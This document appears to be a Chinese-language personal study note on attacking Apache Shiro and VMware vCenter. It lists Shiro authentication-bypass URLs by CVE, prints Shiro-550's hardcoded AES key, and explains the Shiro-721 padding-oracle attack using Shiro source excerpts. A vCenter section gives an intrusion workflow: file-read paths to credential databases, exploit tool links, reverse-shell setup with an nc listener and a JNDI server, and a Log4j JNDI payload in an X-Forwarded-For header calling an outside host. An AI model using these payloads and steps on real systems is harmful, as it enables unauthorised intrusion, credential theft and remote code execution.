# Learn

Shiro
 - CVE-2010-3863:
   Shiro < 1.1.0
   JSecurity 0.9.X
   在getPathWithinApplication中调用getRequestUri方法获取Uri,没有对路径进行标准化处理,导致可以绕过权限认证。

   [users]
   zhang=123,admin
   wang=123,admin,vip
   每一行定义一个用户, 格式是 username = password, role1, role2, ..., roleN
    ​
    [roles]
    admin=user:delete
    角色在这里定义, 格式是 roleName = perm1, perm2, ..., permN
    说明1: 权限名可以使用带有层次的命名方式, 使用冒号来分割层次关系, 比如 user:create 或 user:poweruser:update 权限.
    //说明2: user:* 这样的权限, 代表具有 user:create 和 user:poweruser:update 权限.
    ​
   [urls]
   /static/**=anon
   /login=anon
   /authc/admin/user/delete=perms["user:delete"]
   /authc/admin/user/create=perms["user:create"]
   /authc/admin/**=roles[admin]
   /authc/home=roles[admin,vip]
   /authc/**=authc
   
   绕过：
    http://127.0.0.1//authc/admin
    http://127.0.0.1/./authc/admin
    http://127.0.0.1/xxx/../authc/admin

 - CVE-2016-6802:
   Shiro < 1.3.2
   getContextPath方法中未标准化路径，该漏洞允许攻击者通过利用非根 Servlet 上下文路径，绕过预期的 Servlet 过滤器，从而获取访问权限。
   http://127.0.0.1/xxxx/../admin/index.jsp

 - CVE-2020-1957:
   Shiro < 1.5.2
   spring Boot中使用 Apache Shiro 进行身份验证、权限控制时，可以精心构造恶意的URL，利用 Apache Shiro 和 Spring Boot 对URL的处理的差异化，可以绕过 Apache Shiro 对 Spring Boot 中的 Servlet 的权限控制，越权并实现未授权访问
   chainDefinition.addPathDefinition("/logout", "logout");
   chainDefinition.addPathDefinition("/admin/**", "authc");
   http://127.0.0.1/admin/
   http://127.0.0.1/xxx/..;/admin/

 - CVE-2020-13933:
   Shiro < 1.6.0
   Apache Shiro 1.5.3之前的版本，将Apache Shiro与Spring控制器一起使用时，特制请求可能会导致身份验证绕过
   http://127.0.0.1/;/admin/
   http://127.0.0.1/admin/xx
 - CVE-2020-17510:
   Shiro < 1.7.0
   当与Spring一起使用Apache Shiro时，特制的HTTP请求可能导致认证绕过
   http://127.0.0.1/admin/%2e
 - CVE-2020-17523:
   Shiro < 1.7.1
   当与Spring一起使用Apache Shiro时，特制的HTTP请求可能导致认证绕过
   http://127.0.0.1/admin/%20
 - CVE-2021-41303:
   Shiro < 1.7.1
   当与Spring一起使用Apache Shiro时，特制的HTTP请求可能导致认证绕过
   http://127.0.0.1/admin/%20
 - CVE-2022-32532
   Shiro < 1.9.1



   Shiro 550 漏洞分析：漏洞的原理是shiro版本<=1.2.24的版本中使用了固定的密钥kPH+bIxk5D2deZiIxcaaaA==，这样攻击者直接就可以用这个密钥实现上述加密过程，在Cookie字段写入想要服务端执行的恶意代码，最后服务端在对cookie进行解密的时候（反序列化后）就会执行恶意代码

package org.apache.shiro.mgt;
AbstractRememberMeManager.java

```
public void onSuccessfulLogin(Subject subject, AuthenticationToken token, AuthenticationInfo info) {
        //清除之前的认证
        forgetIdentity(subject);
    //保存新的认证
    //如果勾选了记住我就进入记住认证的函数
    if (isRememberMe(token)) {
        rememberIdentity(subject, token, info);
    } else {
        if (log.isDebugEnabled()) {
            log.debug("AuthenticationToken did not indicate RememberMe is requested.  " +
                    "RememberMe functionality will not be executed for corresponding account.");
        }
    }
}
```

```
public void rememberIdentity(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo) {
     //获取认证的信息
     PrincipalCollection principals = getIdentityToRemember(subject, authcInfo);
    //保存认证的信息
     rememberIdentity(subject, principals);
}
```

```
protected void rememberIdentity(Subject subject, PrincipalCollection accountPrincipals) {
    byte[] bytes = convertPrincipalsToBytes(accountPrincipals);
    rememberSerializedIdentity(subject, bytes);
}
```

```
protected byte[] convertPrincipalsToBytes(PrincipalCollection principals) {
    //重点 序列化认证信息
    byte[] bytes = serialize(principals);
    if (getCipherService() != null) {
        bytes = encrypt(bytes);
    }
    return bytes;
}
```

```
protected byte[] encrypt(byte[] serialized) {
    byte[] value = serialized;
    //获取加密类
    CipherService cipherService = getCipherService();
    if (cipherService != null) {
        //加密，AES/CBC/PKCS5Padding
        ByteSource byteSource = cipherService.encrypt(serialized, getEncryptionCipherKey());
        value = byteSource.getBytes();
    }
    return value;
}
```

```
protected void rememberSerializedIdentity(Subject subject, byte[] serialized) {

	if (!WebUtils.isHttp(subject)) {
        if (log.isDebugEnabled()) {
            String msg = "Subject argument is not an HTTP-aware instance.  This is required to obtain a servlet " +
                    "request and response in order to set the rememberMe cookie. Returning immediately and " +
                   "ignoring rememberMe operation.";
            log.debug(msg);
        }
        return;
    }

    HttpServletRequest request = WebUtils.getHttpRequest(subject);
    HttpServletResponse response = WebUtils.getHttpResponse(subject);

    //base 64 encode it and store as a cookie:
    String base64 = Base64.encodeToString(serialized);

    Cookie template = getCookie(); //the class attribute is really a template for the outgoing cookies
    Cookie cookie = new SimpleCookie(template);
    cookie.setValue(base64);
    cookie.saveTo(request, response);
}
```

反序列化



```
public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) {
    PrincipalCollection principals = null;
    try {
        byte[] bytes = getRememberedSerializedIdentity(subjectContext);
        //SHIRO-138 - only call convertBytesToPrincipals if bytes exist:
        if (bytes != null && bytes.length > 0) {
            principals = convertBytesToPrincipals(bytes, subjectContext);
        }
    } catch (RuntimeException re) {
        principals = onRememberedPrincipalFailure(re, subjectContext);
    }

    return principals;
}
```

```
protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) {

    if (!WebUtils.isHttp(subjectContext)) {
        if (log.isDebugEnabled()) {
            String msg = "SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a " +
                    "servlet request and response in order to retrieve the rememberMe cookie. Returning " +
                    "immediately and ignoring rememberMe operation.";
            log.debug(msg);
        }
        return null;
    }

    WebSubjectContext wsc = (WebSubjectContext) subjectContext;
    if (isIdentityRemoved(wsc)) {
        return null;
    }

    HttpServletRequest request = WebUtils.getHttpRequest(wsc);
    HttpServletResponse response = WebUtils.getHttpResponse(wsc);

    String base64 = getCookie().readValue(request, response);
    // Browsers do not always remove cookies immediately (SHIRO-183)
    // ignore cookies that are scheduled for removal
    if (Cookie.DELETED_COOKIE_VALUE.equals(base64)) return null;

    if (base64 != null) {
        base64 = ensurePadding(base64);
        if (log.isTraceEnabled()) {
           log.trace("Acquired Base64 encoded identity [" + base64 + "]");
        }
        byte[] decoded = Base64.decode(base64);
        if (log.isTraceEnabled()) {
            log.trace("Base64 decoded byte array length: " + (decoded != null ? decoded.length : 0) + " bytes.");
        }
        return decoded;
    } else {
        //no cookie set - new site visitor?
        return null;
    }
}
```



```
protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {
    if (getCipherService() != null) {
        bytes = decrypt(bytes);
    }
    //漏洞点
    return deserialize(bytes);
}
```



```
protected byte[] decrypt(byte[] encrypted) {
    byte[] serialized = encrypted;
    CipherService cipherService = getCipherService();
    if (cipherService != null) {
        ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());
        serialized = byteSource.getBytes();
    }
    return serialized;
}
```



Shiro 721漏洞分析

Apapche Shiro RememberMe Cookie 默认通过 AES-128-CBC 模式加密 ，这种加密模式容易受到 Padding Oracle Attack( Oracle 填充攻击 )，攻击者可以使用有效的 RememberMe Cookie 作为 Paddding Oracle Attack 的前缀，然后精心构造 RememberMe Cookie 来实施反序列化攻击。

Padding Oracle Attack

使用任意账户登陆目标网站，以获取一个合法的 RememberMe Cookie

将获取的值作为POA的前缀

加密反序列化的payload来构造恶意RememberMe Cookie

将构造好的恶意数据填充到 RememberMe Cookie 字段中并发送

**满足条件**：

1. 获取密文和IV

2. 能够出发服务器解密，并且解密失败和成功，响应有差异

   

   

https://www.jianshu.com/p/833582b2f560

#### 1. 分组密码的填充

常用的对称算法，如3DES、AES在加密时一般采用分组密码（Block Cipher），将明文进行分组，如常见的64bit、128bit、256bit。
 分组带来一个问题，就是明文不可能恰好是block的整数倍，对于不能整除剩余的部分数据就涉及到填充操作。常用的填充操作有PKCS#5和PKCS#7，在最后一个block中将不足的bit位数作为bit值进行填充，例如最后一个分组（block）缺少3个bit，就填充3个0x03到结尾，缺少n个bit，就填充n个0x0n。在解密时会校验明文的填充是否满足该规则，如果是以N个0x0N结束，则意味着解密操作执行成功，否则解密操作失败。

![img](https://upload-images.jianshu.io/upload_images/2087924-bed86f68ae4aab66.png?imageMogr2/auto-orient/strip|imageView2/2/format/webp)

####  2.CBC模式密码算法



![img](https://upload-images.jianshu.io/upload_images/2087924-91de3d2bfac81090.png?imageMogr2/auto-orient/strip|imageView2/2/w/600/format/webp)

```php
1. 明文经过填充后，分为不同的组block，以组的方式对数据进行处理 
2. 初始化向量（IV）首先和第一组明文进行XOR（异或）操作，得到”中间值“
3. 采用密钥对中间值进行块加密，删除第一组加密的密文 （加密过程涉及复杂的变换、移位等） 
4. 第一组加密的密文作为第二组的初始向量（IV），参与第二组明文的异或操作  
5. 依次执行块加密，最后将每一块的密文拼接成密文  
```

![img](https://upload-images.jianshu.io/upload_images/2087924-29a85b8f10e0e508.png?imageMogr2/auto-orient/strip|imageView2/2/w/600/format/webp)

```undefined
1. 会将密文进行分组（按照加密采用的分组大小），前面的第一组是初始化向量，从第二组开始才是真正的密文
2. 使用加密密钥对密文的第一组进行解密，得到”中间值“  
3. 将中间值和初始化向量进行异或，得到该组的明文
4. 前一块密文是后一块密文的IV，通过异或中间值，得到明文
5. 块全部解密完成后，拼接得到明文，密码算法校验明文的格式（填充格式是否正确）
6. 校验通过得到明文，校验失败得到密文 
```



现在让我们来看看在不知道明文的情况下，如何猜解处明文。首先我们将密文分组，前面8个字节为初始化向量，后面16个字节为加密后的数据：

```undefined
初始化向量： 7B  21  6A  63  49  51  17  0F
第一组密文： F8  51  D6  CC  68  FC  95  37
第二组密文： 85  87  95  A2  8E  D4  AA  C6
```

将初始化向量全部设置为0，服务器势必会解密失败，返回HTTP 500，那是因为在对数据进行解密的时候，明文最后一个字节的填充是Ox3D,不满足填充规则，校验失败，此时示意图如下：

![img](https://upload-images.jianshu.io/upload_images/2087924-65ec7d2db092f3d5.png?imageMogr2/auto-orient/strip|imageView2/2/w/1200/format/webp)

依次将初始化向量最后一个字节从0x01~0xFF递增，直到解密的明文最后一个字节为0x01，成为一个正确的padding，当初始化向量为000000000000003C时，成功了，服务器返回HTTP 200，解密示意图如下

![img](https://upload-images.jianshu.io/upload_images/2087924-6d05d2a6649b4928.png?imageMogr2/auto-orient/strip|imageView2/2/w/1200/format/webp)

我们已知构造成功的IV最后一个字节为0x3C，最后一个填充字符为0x01，则我们能通过异或XOR计算出，第一组密文解密后的中间值最后一个字节：0x01 xor 0x3C = 0x3D;
 **重点：第一组密文解密的中间值是一直不变的，同样也是正确的，我们通过构造IV值，使得最后一位填充值满足0x01，符合padding规则，则意味着程序解密成功（当前解密的结果肯定不是原来的明文），通过循环测试的方法，猜解出中间值得最后一位，再利用同样的方式猜解前面的中间值，直到获取到完整的中间值**



通过CBC字节翻转攻击，假如我们能够触发加解密过程，并且能够获得每次加密后的密文。那么我们就能够在不知道key的情况下，通过修改密文或IV，来控制输出明文为自己想要的内容，而且只能从最后一组开始修改，并且每改完一组，都需要重新获取一次解密后的数据，要根据解密后的数据来修改前一组密文的值。









# Vcenter系列漏洞检测利用

攻防流程:

1、判断vcenter版本

2、扫描是否存在相关漏洞

3、低权限-提权-高权限

4、ldap添加用户、伪造cookie获取web后台权限

5、获取后台锁屏机器权限

vcenter版本获取  /sdk/vimServiceVersions.xml
```
一、 CVE-2021-21972 – 未授权远程代码执行（vSphere Client 插件）
1.漏洞描述

CVE-2021-21972 vmware vcenter的一个未授权的命令执行漏洞。该漏洞可以上传一个webshell至vcenter服务器的任意位置，然后执行webshell即可。

vSphere Client（HTML5）在 vCenter Server 插件中存在一个远程执行代码漏洞。未授权的攻击者可以通过开放 443 端口的服务器向 vCenter Server 发送精心构造的请求，从而在服务器上写入 webshell，最终造成远程任意代码执行。在 CVE-2021-21972 VMware vCenter Server 远程代码漏洞 中，攻击者可直接通过443端口构造恶意请求，执行任意代码，控制vCenter。

2.受影响版本及漏洞评级

VMware vCenter Server 7.0系列 < 7.0.U1c

VMware vCenter Server 6.7系列 < 6.7.U3l

VMware vCenter Server 6.5系列 < 6.5 U3n

3.复现
title="+ ID_VC_Welcome +"

访问未授权接口/ui/vropspluginui/rest/services/updateova
如果页面返回状态码为200、405，则可能存在漏洞

 https://github.com/NS-Sp4ce/CVE-2021-21972
```
```
二、 CVE-2021-22005 – 任意文件上传导致远程代码执行

1.漏洞描述
VMware是一家云基础架构和移动商务解决方案厂商，提供基于VMware的虚拟化解决方案。2021年9月22日，VMware 官方发布安全公告，披露了包括 CVE-2021-22005 VMware vCenter Server 任意文件上传漏洞在内的多个中高危严重漏洞。在CVE-2021-22005中，攻击者可构造恶意请求，通过vCenter中的Analytics服务，可上传恶意文件，从而造成远程代码执行漏洞。
2.漏洞影响
针对 CVE-2021-22005 VMware vCenter Server 任意文件上传漏洞
VMware vCenter Server 7.0系列 < 7.0 U2c
VMware vCenter Server 6.7系列 < 6.7 U3o
VMware vCenter Server 6.5系列 不受漏洞影响
其余漏洞受影响版本可参考 
https://www.vmware.com/security/advisories/VMSA-2021-0020.html
安全版本：
VMware vCenter Server 7.0 U2c
VMware vCenter Server 6.7 U3o
3.复现
curl -k -v "https://$VCENTER_HOST/analytics/telemetry/ph/api/level?_c=test"
•如果服务器以 200/OK 和响应正文中除“OFF”以外的任何内容（例如“FULL”）进行响应，则它很容易受到攻击
```
```
三、 CVE-2021-21980 任意文件读取漏洞
1.影响范围
vCenter Server 6.7
vCenter Server 6.5
Cloud Foundation (vCenter Server) 3.x
2.漏洞利用
可读取postgresql数据库配置文件
http://x.x.x.x/eam/vib?id=c:\programData\Vmware\vCenterServer\cfg\vmware-vpx\vcdb.properties
直接读取data.mdb文件，提取cookie，登录后台
https://x.x.x.x/eam/vib?id=C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb
```

```
四、CVE-2021-21985 – vSAN 插件远程代码执行
1.描述
vSphere Client（HTML5）中的 vSAN Health Check 插件存在远程代码执行漏洞，攻击者可调用未授权方法执行代码。
2.影响版本
VMware vCenter Server 7.0系列 < 7.0.U2b
VMware vCenter Server 6.7系列 < 6.7.U3n
VMware vCenter Server 6.5系列 < 6.5 U3p
VMware Cloud Foundation 4.x 系列 < 4.2.1
VMware Cloud Foundation 4.x 系列 < 3.10.2.1
出网利用
工具链接：
https://github.com/r0ckysec/CVE-2021-21985
用法如下：
在vps
java -jar JNDIInjection-Bypass.jar 1099 <监听port>
2、在vps
nc接收反弹shell
nc -lvvp <监听port> 
3、攻击机：
python cve-2021-21985_exp.py
条件：
需要目标出网
如果目标不出网，可以尝试研究下原理，打个内存马。
不出网利用
工具链接：
https://github.com/r0ckysec/CVE-2021-21985
具体原理：
利用ClassPathXmlApplicationContext类加载xml文件触发spel注入，weblogic和jackson都有关于这个类的cve，利用方式都差不多。
https://github.com/alt3kx/CVE-2021-21985_PoC?tab=readme-ov-file
```


```
五、CVE-2021-44228 Log4j
xff header jndi注入内存马
漏洞成因是Vcenter的SAML路由中，可以通过增加XFF头触发漏洞，把需要执行的命令跟在XFF后面

GET/websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1
Host: 192.168.121.137
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Dnt: 1
X-Forwarded-For: ${jndi:ldap://9qphlt.dnslog.cn}
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close


DNSlog探测漏洞是否存在; 内网 不出网，可以在内网搭建ldap。  直接注入内存马
```
